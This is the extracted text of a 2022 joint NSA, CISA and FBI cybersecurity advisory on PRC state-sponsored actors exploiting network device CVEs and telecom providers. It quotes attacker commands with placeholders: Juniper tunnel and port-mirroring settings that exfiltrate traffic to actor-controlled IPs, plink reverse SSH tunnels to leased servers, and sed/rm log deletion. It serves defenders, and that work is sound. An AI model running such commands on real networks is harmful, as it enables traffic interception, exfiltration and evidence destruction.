These actors use the network  \nto exploit a wide variety of targets  worldwide , including \npublic and pri vate sector organizations . The advisory  \ndetails the targeting and compromi se of major \ntelecommunications companies and network service \nprovider s and the top vulnerabilities primarily Common \nVulne rabilities and Exposures (CVEs) associated with \nnetwork devices routinely exploited by the cyber actors since 2020.  \nThis joint Cyberse curity Advisory was coauthored by the National Security Agency  \n(NSA) , the Cybersecurity and Infrastructure Security Agency (CISA), and the Federal \nBureau of Investigation (FBI).  It builds on previous NSA, CISA, and FBI reporting to \ninform federal  and state, local, tribal, and territorial (SLTT) government ; critical \ninfrastructure (CI) , including the  Defense Industrial Base (DIB) ; and private sector  \norganizations about notable  trends and persistent tactics, techniques, and procedures \n(TTPs).   \nEntities can mitigate the vulnerabilities listed in this advisory by applying the available \npatches to their systems, replacing end -of-life infrastructure, and implementing a \ncentralized patch management program .   \nNSA, CISA, and the FBI urge U.S. and allied govern ment s, CI, and private industry \norganizations to apply the recommendations listed in the Mitigations  section and Best Practices  \n Apply patches as soon \nas possible  \n Disable unnecessary \nports and protocols  \n Replace end -of-life \ninfrastructure  \n Implement a centralized \npatch management \nsystem  \n\n \nU/OO/ 160405 -22 | PP-22- 0825 | JUN 2022 Ver 1.0  NSA, CISA, & FBI | PRC  State -Sponsored Actors Exploit Network Providers, Devices  \n2 TLP: WHITE  \nAppendix A : Vulnerabilities  to increase the ir defensive posture and reduce the risk of \nPRC state -sponsored malicious cyber actors affecting their critical networks.  \nFor more information on PRC  state -sponsored malicious cyber activity, see CISAs \nChina Cyber Threat Overview and Advisories  webpage.  \nCommon vulnerabilities exploited by People s Republic of \nChina  state -sponsored c yber actors  \nPRC  state -sponsored cyber actors readily exploit vulnerabilities to compromise \nunpatched network devices. Network devices , such as Small Office/Home Office \n(SOHO) routers and Network Attached Storage (NAS) devices,  serve as additional \naccess points to route command and control ( C2) traffic and act as midpoints to conduct \nnetwork intrusions  on other entities . Over the last few years, a  series of high -severity \nvulnerabilities for network devices  provid ed cyber actors  with the ability to regularly \nexploit and gain access  to vulnerable infrastructure devices . In addition, the se devices \nare often overlooked by cyber defende rs, who struggle to maintain and keep pace with \nroutine software patching of Internet -facing  services  and endpoint devices.  \nSince 2020 , PRC  state -sponsored cyber actors have conducted widespread  campaigns \nto rapidly exploit publicly identified security vulnerabilities , also known as common \nvulnerabilities and exposures (CVEs) . This technique has allowed the actors  to gain \naccess into victim accounts using publicly available exploit code against virtual private \nnetwork ( VPN) services [ T1133 ]1 or public facing applications [ T1190 ]without using \ntheir own distinctive or identifying malware so long as the actors  acted before victim \norganizations  updated their systems.  \nPRC  state -sponsored cyber actors typically conduct their intrusions by accessing \ncompromised servers called hop points from numerous China -based Internet Protocol \n(IP) addresses resolving to different Chinese Internet service providers (ISPs). The  \ncyber  actors typically obtain the use of servers  by leasing remote access  directly or \nindirectly f rom hosting providers. They use  these servers to register and access \noperational email accounts, host C2 domains, and interact with victim networks.  Cyber \nactors use these hop points as an obfuscation technique when interacting with victim \nnetworks.  \n                                            \n1 T1133 and similar references are MITRE ATT&CK tactics and techniques , version 11.2 .

NSA, CISA, and the FBI have observed state -sponsored  cyber actors \nmonitoring network defenders  accounts  and actions, and then modify ing their ongoing \ncampaign as needed to remain unde tected . Cyber actors have modified  their \ninfrastructure and toolsets immediately following the release of information relat ed to \ntheir ongoing campaigns.  PRC state -sponsored c yber actors often mix their customized \ntoolset with publicly available tools, especially by  leverag ing tools that are native to the \nnetwork environment, to obscure their activity by b lending into the noise  or normal \nactivity  of a network.  \nNSA, CISA, and the FBI consider the common vulnerabilities and exposures (CVEs)  \nlisted in Table 1 to be the network dev ice CVEs most frequently exploited by PRC  state -\nsponsored  cyber actors since 2020 . \n Table 1: Top network device CVEs e xploited by PRC  state -sponsored cyber a ctors  \n Vendor  CVE Vulnerability Type  \nCisco  CVE-2018 -0171  Remote Code Execution (RCE)  \nCVE-2019 -15271  RCE  \nCVE-2019 -1652  RCE  \nCitrix  CVE-2019 -19781  RCE  \nDrayTek  CVE-2020 -8515  RCE  \nD-Link CVE-2019 -16920  RCE  \nFortinet  CVE-2018 -13382  Authentication Bypass  \nMikroTik CVE-2018 -14847  Authentication Bypass  \nNetgear  CVE-2017 -6862  RCE  \nPulse  CVE-2019 -11510  Authentication Bypass  \nCVE-2021 -22893  RCE  \n CVE-2019 -7192  Privilege Elevation  \nQNAP  CVE-2019 -7193  Remote Inject  \n CVE-2019 -7194  XML Routing Detour Attack  \n CVE-2019 -7195  XML Routing Detour Attack  \nZyxel  CVE-2020 -29583  Authentication Bypass  \n\n \nU/OO/ 160405 -22 | PP-22- 0825 | JUN 2022 Ver 1.0  NSA, CISA, & FBI | PRC  State -Sponsored Actors Exploit Network Providers, Devices  \n4 TLP: WHITE  \nTelecommunications and network service provider targeting  \nPRC  state -sponsored cy ber actors frequently utilize open -source tools for \nreconnaissance and vulnerability scanning. The actors have utilized open -source router \nspecific software frameworks, RouterSploit and RouterScan [ T1595.002 ], to identify \nmakes, models, and known vulnerabilities for further investigation and exploitation. The \nRouterSploit Framework is an open -source exploitation framework dedicated to \nembedded devices. RouterScan is an open -source tool that easily allows for the \nscanning of IP  addresses for vulnerabilities. These tools enable exploitation of SOHO \nand other routers manufactured by major industry providers, including Cisco, Fortinet, \nand MikroTik.  \nUpon gaining an initial foothold into a telecom munications  organization or network \nservice provider, PRC  state -sponsored cyber actors have identified critical users and \ninfrastructure  includ ing systems critical to maintaining the security of authentication, \nauthorization , and accounting. After identifying a  critical Remote Authentication  Dial-In \nUser Service ( RADIUS ) server, the cyber actors gained credentials to access the \nunderlying Structured Query Language ( SQL) database [T1078 ] and utilized SQL \ncommands to dump the credentials [T1555 ], which contain ed both cleartext and hashed \npasswords for user and admin istrative  account s.  \nHaving gained credentials from the RADIUS server, PRC  state -sponsored cyb er actors \nused those credentials with custom automated scripts to authenticate to a router via \nSecure Shell (SSH), execute router commands, and save the output [ T1119 ]. These \nscripts targeted Ci sco and Juniper routers and saved the output of the executed \ncommands, including the current configuration of each router. After successfully \ncapturing the command output, these configurations were exfiltrated off network to the \nactors infrastructure [ TA0010 ]. The cyber actors likely used additional scripting to \nfurther automate the exploitation of medium to large victim networks, where routers and \nswitches are numerous, to gather massive numbers of router configurations that would \nbe necessary to successfully manipulate traffic within the network.  \nArmed with valid accounts and credentials from the compromised RADIUS server and \nthe router configurations, t he cyber actors returned to the network and used  their \naccess and knowledge to successfully authent icate  and execute router commands to \nsurreptitiously route [T1599 ], capture [T1020.001 ], and exfiltrate traffic out of the \nnetwork to actor -controlled infrastructure.   \n\n \nU/OO/ 160405 -22 | PP-22- 0825 | JUN 2022 Ver 1.0  NSA, CISA, & FBI | PRC  State -Sponsored Actors Exploit Network Providers, Devices  \n5 TLP: WHITE  \nWhile other manufacturers likely have similar commands, t he cyber actor s executed the \nfollowing commands on a Juniper router to perform initial tunnel configuration for \neventual exfiltration out of the network:  \n \nAfter establishing the tunnel, the cyber actor s configured the local interface on the \ndevice and updated the routi ng table to route traffic to  actor -controlled infras tructure . \n \nPRC  state-sponsored  cyber  actors then configured port mirroring to copy all traffic to the \nlocal interface , which was  subsequently forwarded through the tunnel out of the network \nto actor -controlled infrastructure.   set interfaces <interface -id> unit <unit number> family inet address <local network IP \naddress subnet>  \nset routin g-options static route <local network IP address> next -hop <actor controlled IP \naddress>  \n set chassis fpc <slot number> pic <user defined value> tunnel -services bandwidth <user \ndefined value>  \nset chassis network -services all -ethernet  \nset interfaces <interface -id> unit <unit number> tunnel source <local network IP address>  \nset interfaces <interface -id> unit <unit number> tunnel destination <actor controlled IP \naddress>  \nset firewall family inet filter <filter name> term <filter variable> then port -mirror  \nset forwarding -options port -mirroring input rate 1  \nset forwarding -options port -mirroring family inet output interface <interface -id> next -hop \n<local network  IP address>  \nset forwarding -options port -mirroring family inet output no -filter-check  \nset interfaces <interface -id> unit <unit number> family inet filter input <filter name>  \nset interfaces <interface -id> unit <unit number> family inet filter output <filter  name>  \n\n \nU/OO/ 160405 -22 | PP-22- 0825 | JUN 2022 Ver 1.0  NSA, CISA, & FBI | PRC  State -Sponsored Actors Exploit Network Providers, Devices  \n6 TLP: WHITE  \n \nHaving completed their configuration changes, the cyber actors often modified and/or \nremoved local log files to destroy evidence of their activity to further obfuscate their \npresence  and evade detection.  \n \nPRC  state-sponsored cyber a ctors  also utilized command line utility programs like \nPuTTY  Link (Plink) to establish SSH tunnels [T1572 ] between internal hosts and leased \nvirtual private server ( VPS) infrastructure. These actors often conduct ed system \nnetwork configuration discovery [T1016.001 ] on these host networks by sending \nhypertext transfer protocol ( HTTP ) requests to C2 infrastructure in order to illuminate \nthe external public IP address.  \n \nMitigations  \nNSA, CISA, and the FBI urge organizations to apply the following recommendations as \nwell as the mitigation and detection recommendations in Appendix A , which are tailored plink.exe N R <local port >:<host 1>:<remote port> -pw <user defined password> -batch \nroot@<VPS1> -P <remote SSH port>  \nplink.exe N R <local port>:<host 2>:<remote port> -pw <user defined password> -batch \nroot@<VPS2> -P <remote SSH port>  \n sed -i -e '/<REGEX>/d' <log filepath 1>  \nsed -i -e '/<REGEX>/d' <log filepath 2>  \nsed -i -e '/<REGEX>/d' <log filepath 3>  \nrm -f <log filepath 4>  \nrm -f <log filepath 5>  \nrm -f <log filepath 6>  \n\n \nU/OO/ 160405 -22 | PP-22- 0825 | JUN 2022 Ver 1.0  NSA, CISA, & FBI | PRC  State -Sponsored Actors Exploit Network Providers, Devices  \n7 TLP: WHITE  \nto observed tactics and techniques. While some vulnerabilit ies have specific additional \nmitigations below, the following mitigations generally apply:  \n Keep systems and products updated and patched as soon as possible after \npatches are released  [D3-SU]2. Consider leveraging a centralized patch \nmanagement system to automate and expedite the process.  \n Immediately remove or isolate suspected compromised  devices from the network  \n[D3-ITF] [D3-OTF]. \n Segment networks to limit or block lateral movement  [D3-NI].  \n Disable unused or unnecessary network services, ports, protocols, and devices  \n[D3-ACH ] [D3-ITF] [D3-OTF].  \n Enforce multifactor authentication (MFA) for all users, without exception  [D3-\nMFA ].  \n Enforce MFA on all VPN connections  [D3-MFA ]. If MFA is unavailable, enforce \npassword complexity requirements  [D3-SPP].  \n Implement strict password requirements, enforcing password complexity, \nchanging passwords at a defined frequency, and performing regular account \nreviews to ensure compliance  [D3-SPP]. \n Perform regular data backup procedures and maintain up -to-date incident \nresponse and recovery procedures .  \n Disable external management capabilities and set up an out -of-band \nmanagement network  [D3-NI]. \n Isolate Internet -facing services in a network Demilitarized Zone (DMZ) to reduce \nthe exposure of the internal network  [D3-NI]. \n Enable robust logging of Internet -facing services and monitor the logs for signs of \ncompromise  [D3-NTA] [D3-PM]. \n Ensure that you have dedicated management systems [D3-PH] and accounts for \nsystem administra tors. Protect these accounts with strict network policies  [D3-\nUAP]. \n Enable robust logging and review of network infrastructure accesses, \nconfiguration changes , and critical infr astruct ure services performing  \nauthentication, authorization , and accounting functions  [D3-PM].  \n                                            \n2 D3-SU and similar references are MITRE D3FEND countermeasures.
